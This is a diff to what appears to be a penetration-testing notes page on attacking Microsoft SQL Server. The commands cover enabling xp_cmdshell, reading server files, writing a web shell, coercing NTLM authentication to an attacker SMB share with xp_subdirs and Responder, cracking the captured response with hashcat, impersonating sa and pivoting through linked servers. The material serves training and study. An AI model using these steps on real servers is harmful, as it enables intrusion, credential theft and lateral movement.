@@ -10,19 +10,19 @@ weight: 2
 - Name: MSSQL
 - Purpose: Database
 - Listening port: **1433 TCP**
-- OS: Windows
+- OS: Windows, Linux
 
-MSSQL is Microsoft's proprietary implementation of a SQL database. It is designed to tightly intergrate into a Windows and Active Directory centric environment. MSSQL is also a popular choice for building applications that run on .NET framework.
+MSSQL is Microsoft's proprietary SQL database platform. It integrates closely with Windows and Active Directory environments and is also available on Linux. MSSQL is a popular choice for building applications that run on the .NET Framework.
 
-### MSSQL Authenticaiton
-MSSQL supports two authentication methods:
-1. **Windows auth**: Used by default, also referred to as **intergrated** security due to its security model being tightly intergrated with Windows and AD.
-    - Specific users and group are trusted to log in to the SQL server.
-2. **Mixed mode**: Supports both Windows/AD accounts and SQL server.
-    - Username and Password are maintained within the SQL server.
+### MSSQL Authentication
+SQL Server on Windows supports two authentication modes:
+1. **Windows Authentication mode**: The default mode, also referred to as **integrated** security because it uses Windows accounts and groups.
+    - Specific Windows users and groups are granted access to SQL Server.
+2. **Mixed mode**: Supports both Windows Authentication and SQL Server Authentication.
+    - For SQL Server Authentication, usernames and password hashes are maintained within SQL Server.
 
 ### MSSQL Default Databases
-MSSQL has several default databases it uses to store information about the database itself as well as information that can help us enumerate names, tables, columns, and etc.:
+MSSQL has several default databases it uses to store information about the database itself as well as information that can help us enumerate names, tables, columns, and other metadata:
 - `master` - keeps the information for an instance of SQL Server.
 - `msdb` - used by SQL Server Agent.
 - `model` - a template database copied for each new database.
@@ -30,7 +30,7 @@ MSSQL has several default databases it uses to store information about the datab
 - `tempdb` - keeps temporary objects for SQL queries.
 
 ## Service Enumeration
-With default (`-sC`) scripts, Nmap enumerates the host's NeBIOS domain name and host name through MSSQL. The version and release of the MSSQL service are also enumerated.
+With default (`-sC`) scripts, Nmap enumerates the host's NetBIOS domain name and host name through MSSQL. The version and release of the MSSQL service are also enumerated.
 ```shell-session
 ╭─brian@rx-93-nu ~
 ╰─$ nmap -Pn -sV -sC -p1433 10.10.10.125
@@ -70,7 +70,7 @@ Host script results:
 
 ## Service Interaction
 
-To connect to an MSSQL instance from a Windows host, we can use `sqlcmd`:
+To connect to an MSSQL instance from a Windows host, we can use `sqlcmd`. In `cmd.exe`, use double quotes for the password: `sqlcmd -S SRVMSSQL -U julio -P "MyPassword!" -y 30 -Y 30`. The single quotes in the captured command below would be passed literally by `cmd.exe`.
 ```shell-session
 C:\> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
 
@@ -96,10 +96,10 @@ Password:
 [!] Press help for extra shell commands
 SQL>
 ```
-- When using Windows Authentication, make sure to specify the domain or hostname of the target, or else `mssqlclient.py` would assume you are using SQL authentication.
+- For Windows Authentication with `mssqlclient.py`, explicitly specify `-windows-auth` and the account's domain or machine context, for example `mssqlclient.py -windows-auth 'DOMAIN/user@<host>'`. Merely specifying a domain does not select Windows Authentication.
 
 ## Database Enumeration
-Enumeration of the database goes like the following:
+Database enumeration proceeds as follows:
 ```txt
 Databases --> Tables --> Columns --> Table Content
 ```
@@ -139,7 +139,7 @@ users
 (8 rows affected)
 ```
 
-From where, we can choose to dump the entire table.
+From there, we can choose to dump the entire table.
 ```shell-session
 1> SELECT * FROM users
 2> go
@@ -161,16 +161,16 @@ SELECT column_name FROM htbusers.INFORMATION_SCHEMA.COLUMNS
 ## Command Execution
 **MSSQL** has an **extended stored procedure** called `xp_cmdshell` that allows us to execute system commands using SQL.
 - `xp_cmdshell` is disabled by default. It can be enabled using **Policy-Based Management** or `sp_configure`.
-- The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account.
-- `xp_cmdshell` operates synchronously, control is not returned until command returns.
+- For sysadmin callers, the Windows process spawned by `xp_cmdshell` runs as the SQL Server service account. Authorized non-sysadmin callers use the configured `##xp_cmdshell_proxy_account##` credential; without it, execution fails.
+- `xp_cmdshell` operates synchronously; control is not returned until the command completes.
 
-The `sysadmin` fixed server role is required to enable `xp_cmdshell`. Use the query below to check if your user has that role.
+Changing this setting through `sp_configure` and `RECONFIGURE` requires `ALTER SETTINGS`, implicitly held by the `sysadmin` and `serveradmin` fixed server roles. Enabling the setting does not itself grant permission to execute `xp_cmdshell`. Use the query below to check whether your login is a sysadmin.
 ```sql
 SELECT IS_SRVROLEMEMBER('sysadmin');
 ```
 - `1` for yes, `0` for no.
 
-If the appropriate privileges are , you can enable `show advanced options` and then `xp_cmdshell`:
+If you have the appropriate privileges, you can enable `show advanced options` and then `xp_cmdshell`:
 ```sql
 -- To allow advanced options to be changed.
 EXECUTE sp_configure 'show advanced options', 1
@@ -225,7 +225,7 @@ NULL
 ```
 
 ## Reading/Writing Local Files
-By default, `MSSQL` allows file read on any file in the OS to which the account has read access.
+`OPENROWSET(BULK...)` can read server-side files when the caller has the required bulk-operation permissions and the effective Windows account has filesystem access. It is not an unrestricted file-read capability available to every SQL login.
 ```shell-session
 1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
 2> GO
@@ -243,8 +243,8 @@ BulkColumn
 (1 rows affected)
 ```
 
-File write from MSSQL, on the other hand, requires **Ole Automation Procedures** to be enabled, which in turn requires admin privileges.
-- Like on MySQL servers, file write can be leveraged for command execution via the use of a web shell (an example PHP web shell is show below).
+The OLE Automation file-write method shown below requires **Ole Automation Procedures** to be enabled, permission to execute the relevant procedures, and filesystem write access for the SQL Server process. OLE Automation is not the only way SQL Server can write files.
+- As with MySQL servers, writing a web shell may enable command execution if the destination is web-accessible and the web server is configured to execute that scripting language (PHP in this example).
 ```shell-session
 1> sp_configure 'show advanced options', 1
 2> GO
@@ -268,8 +268,8 @@ Then, we can create a file like so:
 ```
 
 ## Capture MSSQL Service Hash
-If we get query execution capabilities through SQL injection or we can login as a non-admin user, we can steal the MSSQL service account NetNTLMv2 hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which uses the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system.
-- We can use one of these stored procedures and point them at an attacker-controlled SMB share that forces the MSSQL service to authenticate via NetNTLMv2, which can be done with either **Responder** or **Impacket smbserver.py**
+If we get query execution capabilities through SQL injection or can log in as a non-admin user with permission to execute `xp_subdirs` or `xp_dirtree`, these undocumented stored procedures may trigger outbound SMB authentication when given a UNC path. If NTLM authentication is permitted, we may capture NetNTLMv2 challenge-response material, not the account's reusable NT hash.
+- We can point one of these stored procedures at an attacker-controlled SMB share served by **Responder** or **Impacket smbserver.py**. Capture depends on network reachability and outbound SMB/NTLM policy.
 
 We set up either Responder or `smbserver.py`, then use the stored procedure to coerce NTLM authentication.
 
@@ -287,7 +287,7 @@ subdirectory    depth
 HResult 0x55F6, Level 16, State 1
 xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
 ```
-Then on Responder or `smbserver.py`, we should see the NetNTLMv2 hash of the MSSQL service account captured:
+If authentication occurs, Responder or `smbserver.py` may capture the NetNTLMv2 response associated with the outbound Windows identity:
 ```shell-session
 ╭─brian@rx-93-nu ~
 ╰─$ sudo responder -I tun0
@@ -324,7 +324,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [*] Remaining connections []
 ```
 
-This NetNTLMv2 hash can then be cracked using Hashcat Mode 5600
+This NetNTLMv2 challenge-response material can then be subjected to offline password cracking using Hashcat mode 5600.
 ```bash
 hashcat -m 5600 -O demouser.ntlmv2 /usr/share/dict/rockyou.txt
 ```
@@ -332,9 +332,18 @@ hashcat -m 5600 -O demouser.ntlmv2 /usr/share/dict/rockyou.txt
 ## Impersonate Existing Users
 MSSQL has a special privilege called **IMPERSONATE**, which allows the executing user to take on the permissions of another user. This could allow an attacker with access to an account granted such privilege to achieve privilege escalation or lateral movement.
 
-Usually, sysadmins are allowed to impersonate any other user, while non-admin users needs to have this privilege assigned to them.
+Sysadmins can impersonate other logins, while non-admin logins need appropriate impersonation permissions.
 
-To carry out this attack, we first identify users we can impersonate:
+First, identify explicit login-level impersonation grants. The historical query below joins the grantor, not the target login, and does not establish which logins the current caller can impersonate. To inspect explicit grants and their targets instead, use:
+```sql
+SELECT grantee.name AS grantee, target.name AS target_login, p.state_desc
+FROM sys.server_permissions AS p
+JOIN sys.server_principals AS grantee ON p.grantee_principal_id = grantee.principal_id
+JOIN sys.server_principals AS target ON p.major_id = target.principal_id
+WHERE p.class_desc = 'SERVER_PRINCIPAL'
+  AND p.permission_name = 'IMPERSONATE';
+```
+This is not a complete effective-permissions check: role membership, inherited permissions, and denials must also be considered, and metadata visibility can limit results. Historical capture:
 ```shell-session
 1> SELECT distinct b.name
 2> FROM sys.server_permissions a
@@ -372,9 +381,9 @@ sa
 - The impersonation was successful and `1` indicates `sa` has the `sysadmin` role.
 
 ## MSSQL Linked Servers
-MSSQL has a configuration option called **linked servers**, which allowed the DB engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server. If configured, this allows attackers who control the MSSQL instance to move laterally onto other database servers.
+MSSQL has a configuration option called **linked servers**, which allows the DB engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server. If configured, this allows attackers who control the MSSQL instance to move laterally onto other database servers.
 
-We can configured identiy linked server like so:
+We can identify configured linked servers like so:
 ```shell-session
 1> SELECT srvname, isremote FROM sysservers
 2> GO
@@ -389,7 +398,7 @@ DESKTOP-MFERMN4\SQLEXPRESS          1
 - `1` indicates remote server.
 ```
 
-Now, we can execute queries on the linked server like so:
+With a suitable linked-server login mapping and `rpc out` enabled, we can execute a query on the linked server like so:
 ```shell-session
 1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
 2> GO
@@ -400,7 +409,7 @@ DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote         
 (1 rows affected)
 ```
 
-This process can be simplified when using `mssqlclient.py`. The `enum_link` command allows us to quickly enumerate linked servers, while `use_link` allows us to run queries without typing the remote query statement out every time.
+This process can be simplified when using `mssqlclient.py`. The `enum_links` command allows us to quickly enumerate linked servers, while `use_link` allows us to run queries without typing the remote query statement out every time.
 ```shell-session
 SQL (sqluser  guest@master)> enum_links
 SRV_NAME                SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE          SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
